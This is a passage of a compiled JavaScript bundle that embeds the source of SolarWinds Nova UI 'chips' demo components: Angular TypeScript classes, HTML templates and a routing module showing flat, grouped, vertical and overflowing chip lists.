<nui-chips-custom-css-example></nui-chips-custom-css-example>\n</nui-example-wrapper>\n'},22428:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-chips-docs-example",\n    templateUrl: "./chips-docs.example.component.html",\n})\nexport class ChipsDocsExampleComponent {}\n'},20294:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-chips\n    id="nui-demo-chips-overflow"\n    [itemsSource]="horizontalGroupedItemsSource"\n    [overflowLinesNumber]="overflowLinesNumber"\n    [overflow]="true"\n    (chipRemoved)="onClear($event)"\n    (chipsOverflowed)="onChipsOverflow($event)"\n    (removeAll)="onClearAll($event)"\n>\n    <div\n        class="nui-chips-overflowed"\n        #overflowCounterLabel\n        *ngIf="overflowCounter > 0"\n    >\n        <nui-popover\n            trigger="click"\n            [popoverOverlayPosition]="overflowPopoverPosition"\n            [template]="popoverWithClickTrigger"\n        >\n            <a class="nui-chips-overflowed__counter">+{{ overflowCounter }}</a>\n        </nui-popover>\n    </div>\n</nui-chips>\n\n<ng-template #popoverWithClickTrigger>\n    <nui-chips-overflow\n        [overflowSource]="overflowSource"\n        [itemsSource]="horizontalGroupedItemsSource"\n        (chipRemoved)="onClear($event)"\n        orientation="vertical"\n    >\n    </nui-chips-overflow>\n</ng-template>\n'},11442:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewChild } from "@angular/core";\nimport _pull from "lodash/pull";\n\nimport {\n    IChipsGroup,\n    IChipsItem,\n    IChipsItemsSource,\n    PopoverComponent,\n    PopoverOverlayPosition,\n} from "@nova-ui/bits";\n\nconst flatItems: IChipsItem[] = [\n    { id: "flatId1", label: "Down" },\n    { id: "flatId2", label: "Critical" },\n    { id: "flatId3", label: "Warning" },\n    { id: "flatId1", label: "Down" },\n    { id: "flatId2", label: "Critical" },\n    { id: "flatId3", label: "Warning" },\n    { id: "flatId1", label: "Down" },\n    { id: "flatId2", label: "Critical" },\n    { id: "flatId3", label: "Warning" },\n];\n\nconst groupedItems: IChipsGroup[] = [\n    {\n        id: "statusGroupId",\n        label: "Status",\n        items: [\n            { id: "statusGroupItem1", label: "Down" },\n            { id: "statusGroupItem2", label: "Critical" },\n            { id: "statusGroupItem3", label: "Warning" },\n            { id: "statusGroupItem4", label: "Unknown" },\n            { id: "statusGroupItem5", label: "Ok" },\n        ],\n    },\n    {\n        id: "vendorGroupId",\n        label: "Vendor",\n        items: [\n            { id: "vendorGroupItem1", label: "Cisco" },\n            { id: "vendorGroupItem2", label: "Hewlett Packard" },\n            { id: "vendorGroupItem3", label: "Uniper" },\n        ],\n    },\n    {\n        id: "statusGroupId",\n        label: "Status",\n        items: [\n            { id: "statusGroupItem1", label: "Down" },\n            { id: "statusGroupItem2", label: "Critical" },\n            { id: "statusGroupItem3", label: "Warning" },\n            { id: "statusGroupItem4", label: "Unknown" },\n            { id: "statusGroupItem5", label: "Ok" },\n        ],\n    },\n    {\n        id: "vendorGroupId",\n        label: "Vendor",\n        items: [\n            { id: "vendorGroupItem1", label: "Cisco" },\n            { id: "vendorGroupItem2", label: "Hewlett Packard" },\n            { id: "vendorGroupItem3", label: "Uniper" },\n        ],\n    },\n];\n\n@Component({\n    selector: "nui-chips-overflow-example",\n    templateUrl: "./chips-overflow.example.component.html",\n    styles: [\n        `\n            .nui-chips-overflowed__counter {\n                margin-left: 3px;\n                display: inline-flex;\n            }\n        `,\n    ],\n})\nexport class ChipsOverflowExampleComponent {\n    public horizontalGroupedItemsSource = { flatItems, groupedItems };\n\n    public overflowLinesNumber = 2;\n    public overflowCounter: number;\n    public overflowSource: IChipsItemsSource;\n    public overflowPopoverPosition: PopoverOverlayPosition[] = [\n        PopoverOverlayPosition.bottomLeft,\n        PopoverOverlayPosition.topLeft,\n    ];\n\n    @ViewChild(PopoverComponent) private popover: PopoverComponent;\n\n    public onClear(event: { item: IChipsItem; group?: IChipsGroup }): void {\n        console.log(\n            `\'onClear\' event fired. $event.item.id=${event.item.id} $event.group.id=${event.group?.id}`\n        );\n        if (event.group) {\n            _pull(event.group.items || [], event.item);\n        } else {\n            _pull(\n                this.horizontalGroupedItemsSource.flatItems || [],\n                event.item\n            );\n        }\n    }\n\n    public onClearAll(e: MouseEvent): void {\n        this.horizontalGroupedItemsSource.groupedItems = [];\n        this.horizontalGroupedItemsSource.flatItems = [];\n        this.popover?.onClick(e);\n    }\n\n    onChipsOverflow(source: IChipsItemsSource): void {\n        this.overflowSource = source;\n        const reducer = (accumulator: number, currentValue: IChipsGroup) =>\n            accumulator + currentValue.items.length;\n        this.overflowCounter =\n            (this.overflowSource.flatItems?.length || 0) +\n            (this.overflowSource.groupedItems?.reduce(reducer, 0) || 0);\n        this.popover?.updatePosition();\n    }\n}\n'},58510:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div>\n        <nui-chips\n            id="nui-demo-chips-flat-horizontal"\n            [autoHide]="true"\n            [itemsSource]="horizontalFlatItemsSource"\n            (chipRemoved)="onClear($event)"\n            (removeAll)="onClearAll()"\n        >\n        </nui-chips>\n    </div>\n\n    <div>\n        <nui-chips\n            id="nui-demo-chips-flat-vertical"\n            [autoHide]="true"\n            title="Statuses"\n            [itemsSource]="verticalFlatItemsSource"\n            orientation="vertical"\n            (chipRemoved)="onClearVertical($event)"\n            (removeAll)="onClearAllVerticalFlat()"\n        >\n        </nui-chips>\n    </div>\n\n    <div>\n        <nui-chips\n            id="nui-demo-chips-grouped-horizontal"\n            [autoHide]="false"\n            [itemsSource]="horizontalGroupedItemsSource"\n            (chipRemoved)="onClearGroup($event)"\n            (removeAll)="onClearAll()"\n        >\n        </nui-chips>\n    </div>\n\n    <div>\n        <nui-chips\n            id="nui-demo-chips-vertical"\n            [autoHide]="false"\n            [itemsSource]="verticalFlatItemsSource"\n            orientation="vertical"\n            (chipRemoved)="onClearVertical($event)"\n            (removeAll)="onClearAllVerticalFlat()"\n        >\n        </nui-chips>\n    </div>\n\n    <div>\n        <nui-chips\n            id="nui-demo-chips-grouped-vertical"\n            [autoHide]="true"\n            title="Filters"\n            [itemsSource]="verticalGroupedItemsSource"\n            orientation="vertical"\n            (chipRemoved)="onClearGroup($event)"\n            (removeAll)="onClearAll()"\n        >\n        </nui-chips>\n    </div>\n\n    <div>\n        <nui-chips\n            id="nui-demo-chips-autohide"\n            [autoHide]="false"\n            [itemsSource]="horizontalFlatItemsSource"\n            (chipRemoved)="onClear($event)"\n            (removeAll)="onClearAll()"\n        >\n        </nui-chips>\n    </div>\n\n    <div>\n        <nui-chips-overflow-example></nui-chips-overflow-example>\n    </div>\n</div>\n'},26634:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport _cloneDeep from "lodash/cloneDeep";\nimport _pull from "lodash/pull";\n\nimport { IChipsGroup, IChipsItem, IChipsItemsSource } from "@nova-ui/bits";\n\nconst horizontalFlatItems: IChipsItem[] = [\n    { id: "flatId1", label: "Down" },\n    { id: "flatId2", label: "Critical" },\n    { id: "flatId3", label: "Warning" },\n    { id: "flatId4", label: "Unknown" },\n    { id: "flatId5", label: "Ok" },\n];\n\nconst verticalFlatItems: IChipsItem[] = [\n    { id: "flatId1", label: "Down" },\n    { id: "flatId2", label: "Critical" },\n    { id: "flatId3", label: "Warning" },\n    { id: "flatId4", label: "Unknown" },\n    { id: "flatId5", label: "Ok" },\n];\n\nconst groupedItems: IChipsGroup[] = [\n    {\n        id: "statusGroupId",\n        label: "Status",\n        items: [\n            { id: "statusGroupItem1", label: "Down" },\n            { id: "statusGroupItem2", label: "Critical" },\n            { id: "statusGroupItem3", label: "Warning" },\n            { id: "statusGroupItem4", label: "Unknown" },\n            { id: "statusGroupItem5", label: "Ok" },\n        ],\n    },\n    {\n        id: "vendorGroupId",\n        label: "Vendor",\n        items: [\n            { id: "vendorGroupItem1", label: "Cisco" },\n            { id: "vendorGroupItem2", label: "Hewlett Packard" },\n            { id: "vendorGroupItem3", label: "Uniper" },\n        ],\n    },\n];\n\n@Component({\n    selector: "chips-test-component",\n    templateUrl: "./chips-test.component.html",\n})\nexport class ChipsTestComponent {\n    public horizontalFlatItemsSource: IChipsItemsSource = {\n        flatItems: horizontalFlatItems,\n    };\n    public horizontalGroupedItemsSource = {\n        groupedItems: _cloneDeep(groupedItems),\n    };\n    public verticalFlatItemsSource: IChipsItemsSource = {\n        flatItems: verticalFlatItems,\n    };\n    public verticalGroupedItemsSource: IChipsItemsSource = {\n        groupedItems: _cloneDeep(groupedItems),\n    };\n\n    public onClear(event: { item: IChipsItem }): void {\n        _pull(this.horizontalFlatItemsSource.flatItems || [], event.item);\n    }\n\n    public onClearVertical(event: { item: IChipsItem }): void {\n        _pull(this.verticalFlatItemsSource.flatItems || [], event.item);\n    }\n\n    public onClearGroup(event: {\n        item: IChipsItem;\n        group?: IChipsGroup;\n    }): void {\n        _pull(event.group?.items || [], event.item);\n    }\n\n    public onClearAll(): void {\n        this.verticalGroupedItemsSource.groupedItems = [];\n    }\n\n    public onClearAllVerticalFlat(): void {\n        this.verticalFlatItemsSource.flatItems = [];\n    }\n}\n'},83652:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div>\n        <h3>Basic chips</h3>\n        <nui-chips\n            id="nui-demo-chips-flat-horizontal-visual"\n            [itemsSource]="horizontalFlatItemsSource"\n            (chipRemoved)="onClear($event)"\n            (removeAll)="onClearAll()"\n        >\n        </nui-chips>\n    </div>\n    <hr />\n\n    <div>\n        <h3>Chips grouped</h3>\n        <nui-chips\n            id="nui-demo-chips-grouped-horizontal-visual"\n            [itemsSource]="horizontalGroupedItemsSource"\n            (chipRemoved)="onClearGroup($event)"\n            (removeAll)="onClearAll()"\n        >\n        </nui-chips>\n    </div>\n    <hr />\n\n    <div>\n        <h3>Chips vertical</h3>\n        <nui-chips\n            id="nui-demo-chips-vertical-visual"\n            [itemsSource]="verticalFlatItemsSource"\n            title="Statuses"\n            i18n-title\n            orientation="vertical"\n            (chipRemoved)="onClear($event)"\n            (removeAll)="onClearAll()"\n        >\n        </nui-chips>\n    </div>\n    <hr />\n\n    <div>\n        <h3>Chips vertical grouped</h3>\n        <nui-chips\n            id="nui-demo-chips-grouped-vertical-visual"\n            [itemsSource]="verticalGroupedItemsSource"\n            title="Filters"\n            i18n-title\n            orientation="vertical"\n            (chipRemoved)="onClear($event)"\n            (removeAll)="onClearAll()"\n        >\n        </nui-chips>\n    </div>\n    <hr />\n\n    <div>\n        <h3>Chips overflow</h3>\n        <nui-chips-overflow-example></nui-chips-overflow-example>\n    </div>\n    <hr />\n\n    <div>\n        <h3>Chip content-projection</h3>\n        <nui-chip\n            >Custom content\n            <nui-icon class="ml-2" iconSize="small" icon="add"></nui-icon\n        ></nui-chip>\n    </div>\n    <hr />\n\n    <div>\n        <h3>Chips Custom Css</h3>\n        <nui-chips-custom-css-example></nui-chips-custom-css-example>\n    </div>\n    <hr />\n</div>\n'},32324:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport _cloneDeep from "lodash/cloneDeep";\nimport _pull from "lodash/pull";\n\nimport { IChipsGroup, IChipsItem, IChipsItemsSource } from "@nova-ui/bits";\n\nconst horizontalFlatItems: IChipsItem[] = [\n    { id: "flatId1", label: "Down" },\n    { id: "flatId2", label: "Critical" },\n    { id: "flatId3", label: "Warning" },\n    { id: "flatId4", label: "Unknown" },\n    { id: "flatId5", label: "Ok" },\n];\n\nconst groupedItems: IChipsGroup[] = [\n    {\n        id: "statusGroupId",\n        label: "Status",\n        items: [\n            { id: "statusGroupItem1", label: "Down" },\n            { id: "statusGroupItem2", label: "Critical" },\n            { id: "statusGroupItem3", label: "Warning" },\n            { id: "statusGroupItem4", label: "Unknown" },\n            { id: "statusGroupItem5", label: "Ok" },\n        ],\n    },\n    {\n        id: "vendorGroupId",\n        label: "Vendor",\n        items: [\n            { id: "vendorGroupItem1", label: "Cisco" },\n            { id: "vendorGroupItem2", label: "Hewlett Packard" },\n            { id: "vendorGroupItem3", label: "Uniper" },\n        ],\n    },\n];\n\nconst verticalFlatItemsVisual: IChipsItem[] = [\n    { id: "flatId1", label: "Down" },\n    { id: "flatId2", label: "Critical" },\n    { id: "flatId3", label: "Warning" },\n    { id: "flatId4", label: "Unknown" },\n    { id: "flatId5", label: "Ok" },\n];\n\n@Component({\n    selector: "nui-chips-visual-test",\n    templateUrl: "./chips-visual-test.component.html",\n})\nexport class ChipsVisualTestComponent {\n    public horizontalFlatItemsSource: IChipsItemsSource = {\n        flatItems: horizontalFlatItems,\n    };\n    public horizontalGroupedItemsSource = {\n        groupedItems: _cloneDeep(groupedItems),\n    };\n    public verticalFlatItemsSource: IChipsItemsSource = {\n        flatItems: verticalFlatItemsVisual,\n    };\n    public verticalGroupedItemsSource: IChipsItemsSource = {\n        groupedItems: _cloneDeep(groupedItems),\n    };\n\n    public onClear(event: { item: IChipsItem }): void {\n        _pull(this.horizontalFlatItemsSource.flatItems || [], event.item);\n    }\n\n    public onClearGroup(event: {\n        item: IChipsItem;\n        group?: IChipsGroup;\n    }): void {\n        _pull(event.group?.items || [], event.item);\n    }\n\n    public onClearAll(): void {\n        this.verticalGroupedItemsSource.groupedItems = [];\n    }\n}\n'},39747:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiChipsModule,\n    NuiDocsModule,\n    NuiIconModule,\n    NuiPopoverModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    AutohideChipsExampleComponent,\n    BasicChipsExampleComponent,\n    ChipsCustomCssExampleComponent,\n    ChipsDocsExampleComponent,\n    ChipsOverflowExampleComponent,\n    ChipsVisualTestComponent,\n    ChipsTestComponent,\n    GroupedChipsExampleComponent,\n    VerticalFlatChipsExampleComponent,\n    VerticalGroupedChipsExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: ChipsDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "overflow",\n        component: ChipsOverflowExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "chips-visual-test",\n        component: ChipsVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "chips-test",\n        component: ChipsTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "custom-css",\n        component: ChipsCustomCssExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiChipsModule,\n        NuiPopoverModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n        NuiIconModule,\n    ],\n    declarations: [\n        AutohideChipsExampleComponent,\n        BasicChipsExampleComponent,\n        ChipsDocsExampleComponent,\n        ChipsVisualTestComponent,\n        ChipsTestComponent,\n        GroupedChipsExampleComponent,\n        VerticalFlatChipsExampleComponent,\n        VerticalGroupedChipsExampleComponent,\n        ChipsOverflowExampleComponent,\n        ChipsCustomCssExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("chips"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ChipsModule {}\n'},74484:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-chips\n    id="nui-demo-chips-grouped-horizontal"\n    [itemsSource]="horizontalGroupedItemsSource"\n    (chipRemoved)="onClear($event)"\n    (removeAll)="onClearAll()"\n>\n</nui-chips>\n'},6535:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport _cloneDeep from "lodash/cloneDeep";\nimport _pull from "lodash/pull";\n\nimport { IChipsGroup, IChipsItem } from "@nova-ui/bits";\n\nconst groupedItems: IChipsGroup[] = [\n    {\n        id: "statusGroupId",\n        label: "Status",\n        items: [\n            { id: "statusGroupItem1", label: "Down" },\n            { id: "statusGroupItem2", label: "Critical" },\n            { id: "statusGroupItem3", label: "Warning" },\n            { id: "statusGroupItem4", label: "Unknown" },\n            { id: "statusGroupItem5", label: "Ok" },\n        ],\n    },\n    {\n        id: "vendorGroupId",\n        label: "Vendor",\n        items: [\n            { id: "vendorGroupItem1", label: "Cisco" },\n            { id: "vendorGroupItem2", label: "Hewlett Packard" },\n            { id: "vendorGroupItem3", label: "Uniper" },\n        ],\n    },\n];\n\n@Component({\n    selector: "nui-grouped-chips-example",\n    templateUrl: "./grouped-chips.example.component.html",\n})\nexport class GroupedChipsExampleComponent {\n    public horizontalGroupedItemsSource = {\n        groupedItems: _cloneDeep(groupedItems),\n    };\n\n    public onClear(event: { item: IChipsItem; group?: IChipsGroup }): void {\n        console.log(\n            `\'onClear\' event fired. $event.item.id=${event.item.id} $event.group.id=${event.group?.id}`\n        );\n        _pull(event.group?.items || [], event.item);\n    }\n\n    public onClearAll(): void {\n        this.horizontalGroupedItemsSource.groupedItems = [];\n    }\n}\n'},85026:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./chips-docs/chips-docs.example.component";\nexport * from "./basic-chips/basic-chips.example.component";\nexport * from "./grouped-chips/grouped-chips.example.component";\nexport * from "./vertical-flat-chips/vertical-flat-chips.example.component";\nexport * from "./vertical-grouped-chips/vertical-grouped-chips.example.component";\nexport * from "./autohide-chips/autohide-chips.example.component";\nexport * from "./chips-visual-test/chips-visual-test.component";\nexport * from "./chips-overflow/chips-overflow.example.component";\nexport * from "./chips-custom-css/chips-custom-css.example.component";\nexport * from "./chips-custom-css/chips-custom-css.example.component";\nexport * from "./chips-test/chips-test.component";\n'},61980:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div style="max-width: 300px">\n    <nui-chips\n        id="nui-demo-chips-flat-vertical"\n        [itemsSource]="verticalFlatItemsSource"\n        title="Statuses"\n        i18n-title\n        orientation="vertical"\n        (chipRemoved)="onClear($event)"\n        (removeAll)="onClearAll()"\n    >\n    </nui-chips>\n</div>\n'},33772:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport _pull from "lodash/pull";\n\nimport { IChipsItem, IChipsItemsSource } from "@nova-ui/bits";\n\nconst verticalFlatItems: IChipsItem[] = [\n    { id: "flatId1", label: "Down" },\n    { id: "flatId2", label: "Critical" },\n    { id: "flatId3", label: "Warning" },\n    { id: "flatId4", label: "Unknown" },\n    { id: "flatId5", label: "Ok" },\n];\n\n@Component({\n    selector: "nui-vertical-flat-chips-example",\n    templateUrl: "vertical-flat-chips.example.component.html",\n})\nexport class VerticalFlatChipsExampleComponent {\n    public verticalFlatItemsSource: IChipsItemsSource = {\n        flatItems: verticalFlatItems,\n    };\n\n    public onClear(event: { item: IChipsItem }): void {\n        console.log(`\'onClear\' event fired. $event.item.id=${event.item.id}`);\n        _pull(this.verticalFlatItemsSource.flatItems || [], event.item);\n    }\n\n    public onClearAll(): void {\n        this.verticalFlatItemsSource.flatItems = [];\n    }\n}\n'},19344:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div style="max-width: 300px">\n    <nui-chips\n        id="nui-demo-chips-grouped-vertical"\n        [itemsSource]="verticalGroupedItemsSource"\n        title="Filters"\n        i18n-title\n        orientation="vertical"\n        (chipRemoved)="onClear($event)"\n        (removeAll)="onClearAll()"\n    >\n    </nui-chips>\n</div>\n'},65328:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  